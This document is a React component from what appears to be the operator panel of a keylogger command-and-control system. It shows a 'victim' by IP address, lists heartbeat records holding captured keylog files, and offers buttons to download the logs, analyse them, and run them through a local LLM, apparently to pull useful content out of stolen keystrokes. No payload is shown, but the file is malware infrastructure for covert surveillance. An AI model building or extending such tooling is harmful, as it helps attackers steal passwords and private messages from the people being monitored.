import React, { useEffect, useState } from 'react';
import { useParams, Link, useNavigate } from 'react-router-dom';
import api from '../api';
import { toast } from 'react-toastify';

const VictimDetail = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [victim, setVictim] = useState(null);
  const [analyzingId, setAnalyzingId] = useState(null);

  useEffect(() => {
    api.get(`/v1/victims/${id}`)
      .then(res => {
        setVictim(res.data);
        console.log(res.data);
      })
      .catch(err => console.error(err));
  }, [id]);

  const handleDownload = (heartbeatId) => {
    api.get(`/v1/heartbeat/file/${heartbeatId}`, { responseType: 'blob' })
      .then(res => {
        const fileURL = window.URL.createObjectURL(new Blob([res.data]));
        const link = document.createElement('a');
        link.href = fileURL;
        link.setAttribute('download', `keylog_${heartbeatId}.txt`);
        document.body.appendChild(link);
        link.click();
        link.remove();
      })
      .catch(err => {
        console.error('Error downloading file:', err.response);
      });
  };

  const handleAnalyze = (heartbeatId) => {
    setAnalyzingId(heartbeatId);

    api.get(`/v1/heartbeat/analyze/${heartbeatId}`)
      .then((res) => {
        navigate(`/heartbeat/analyse/${heartbeatId}`);
      })
      .catch(err => {
        console.error('Error analyzing file:', err);
        toast.error(err.response?.data?.message || err.message || 'Error analyzing file');
      })
      .finally(() => {
        setAnalyzingId(null);
      });
  };

  const handlePredictLocalLLM = (heartbeatId) => {
    setAnalyzingId(heartbeatId + '_ollama');

    api.get(`/v1/heartbeat/analyze_ollama/${heartbeatId}`)
      .then((res) => {
        navigate(`/heartbeat/analyse/${heartbeatId}?type=ollama`);
      })
      .catch(err => {
        console.error('Error predicting with local llm:', err);
        toast.error(err.response?.data?.message || err.message || 'Error predicting with local llm. Please retry as the endpoint call does return sometimes bad gateway.');
      })
      .finally(() => {
        setAnalyzingId(null);
      });
  };

  if (!victim) return <p>Loading...</p>;

  return (
    <div className="container mt-4">
      <h2>Victim Detail</h2>
      <p><strong>IP Address:</strong> {victim.ipAddress}</p>

      <h3>Heartbeats</h3>
      <table className="table table-striped table-bordered">
        <thead className="table-dark">
          <tr>
            <th>ID</th>
            <th>Timestamp</th>
            <th>Keylog File</th>
          </tr>
        </thead>
        <tbody>
          {victim.heartbeats?.map(h => (
            <tr key={h.id}>
              <td>{h.id}</td>
              <td>{new Date(h.timestamp).toLocaleString()}</td>
              <td>
                <button
                  className="btn btn-sm btn-primary me-2"
                  onClick={() => handleDownload(h.id)}
                  disabled={h.emptyFile}
                >
                  Download
                </button>
                <button
                  className="btn btn-sm btn-warning me-2"
                  onClick={() => handleAnalyze(h.id)}
                  disabled={analyzingId === h.id || h.emptyFile}
                >
                  {analyzingId === h.id ? 'Loading...' : 'Analyze'}
                </button>
                <button
                  className="btn btn-sm btn-info"
                  onClick={() => handlePredictLocalLLM(h.id)}
                  disabled={analyzingId === h.id + '_ollama' || h.emptyFile}
                >
                  {analyzingId === h.id + '_ollama' ? 'Loading...' : 'Predict with Local LLM'}
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>

    </div>
  );
};

export default VictimDetail;
